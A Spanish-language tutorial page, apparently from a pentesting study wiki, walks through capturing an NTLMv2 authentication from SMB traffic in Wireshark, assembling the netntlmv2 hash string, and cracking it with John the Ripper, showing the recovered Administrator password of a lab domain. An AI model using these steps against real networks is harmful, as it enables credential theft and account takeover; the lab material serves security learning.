---
icon: donut
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# NTLM Roasting

Nosotros con esta tecnica lo que vamos hacer es capturar la comunicacion `NTLM` que se realiza cuando un usuario se autentica de forma local, lo mas comun es mediante `SMB` para acceder a recursos compartidos y obtener en este trafico de red ese `hash NTLM` como hemos estado haciendo en anteriores ocasiones con `kerberos`.

Si por ejemplo un usuario en este caso un `Administrador` se conectara mediante `SMB` a un recuros compartido de la siguiente forma:

```powershell
dir \\192.168.5.208\c$
```

Lo que esta sucediendo aqui es una autenticacion mediante `NTLM` por lo que si nosotros interceptamos esa comunicacion en ese momento podremos ver el codigo `challengue` directamente el cual necesitaremos retocar un poco.

Si nosotros nos ponemos a la escucha con `Wireshark` y capturamos dicha peticion, veremos lo siguiente.

<figure><img src="../../.gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>

A nosotros nos interesa donde pone `NTLM Server Challenge` ese numerito es el que nos va a interesar, por lo que lo copiamos, despues tendremos que irnos al siguiente paquete que sera donde le responde y lo que tendremos que copiar sera el `challenge` cifrado.

<figure><img src="../../.gitbook/assets/image (176).png" alt=""><figcaption></figcaption></figure>

Donde pone `NTLMv2 Response [...]` es lo que nos interesa copiar tambien.

Tambien otra de las cosas que tendremos que copiar sera el nombre de usuario del cual se esta conectando, para que esto funcione.

<figure><img src="../../.gitbook/assets/image (177).png" alt=""><figcaption></figcaption></figure>

Y vemos que es el `Administrator`, por lo que nos lo copiaremos tambien, toda la informacion copiada se veria tal que asi:

```
Challenge: e1cabebb6c67ef43
Nombre de usuario: Administrator
Challenge Cifrado: 4c690787731aa6bae58eff34da1448ef0101000000000000ea96474f0c6ddb01c99cde0e39dbbc19000000000200080043004f00520050000100080057005300300031000400140063006f00720070002e006c006f00630061006c0003001e0057005300300031002e0063006f00720070002e006c006f00630061006c000500140063006f00720070002e006c006f00630061006c0007000800ea96474f0c6ddb0106000400020000000800300030000000000000000000000000300000ace21c7faca2562f2c447d78310e4a3efddc1c854e52bfc18db9e0dec3d525070a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0035002e003200300038000000000000000000
```

Y tendremos que crear un `hash` con el siguiente formato y con toda esta informacion.

```
UserName::Domain:NTLM_Server_Challenge:NTProofStr:NTLMv2Response-NTProofStr
```

Y esto con toda la informacion se veria asi:

```
Administrator::CORP:e1cabebb6c67ef43:4c690787731aa6bae58eff34da1448ef:0101000000000000ea96474f0c6ddb01c99cde0e39dbbc19000000000200080043004f00520050000100080057005300300031000400140063006f00720070002e006c006f00630061006c0003001e0057005300300031002e0063006f00720070002e006c006f00630061006c000500140063006f00720070002e006c006f00630061006c0007000800ea96474f0c6ddb0106000400020000000800300030000000000000000000000000300000ace21c7faca2562f2c447d78310e4a3efddc1c854e52bfc18db9e0dec3d525070a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0035002e003200300038000000000000000000
```

El `NTProofStr` se consigue en esta seccion de aqui del paquete capturado.

<figure><img src="../../.gitbook/assets/image (178).png" alt=""><figcaption></figcaption></figure>

Ahora teniendo ese `hash` de esa forma estructurada, si notros nos lo pasamos al `kali` y lo intentamos `crackear` de la siguiente forma:

```shell
nano admin.ntlmv2

#Dentro del nano
Administrator::CORP:e1cabebb6c67ef43:4c690787731aa6bae58eff34da1448ef:0101000000000000ea96474f0c6ddb01c99cde0e39dbbc19000000000200080043004f00520050000100080057005300300031000400140063006f00720070002e006c006f00630061006c0003001e0057005300300031002e0063006f00720070002e006c006f00630061006c000500140063006f00720070002e006c006f00630061006c0007000800ea96474f0c6ddb0106000400020000000800300030000000000000000000000000300000ace21c7faca2562f2c447d78310e4a3efddc1c854e52bfc18db9e0dec3d525070a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0035002e003200300038000000000000000000
```

Lo guardamos y hacemos lo siguiente:

```shell
john admin.ntlmv2
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Passw0rd         (Administrator)     
1g 0:00:00:00 DONE 2/3 (2025-01-22 15:44) 33.33g/s 391500p/s 391500c/s 391500C/s Piano..Open
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Vemos que nos lo crackeo correctamente y que nos porporciono la contraseña del usuario `Administrador`.
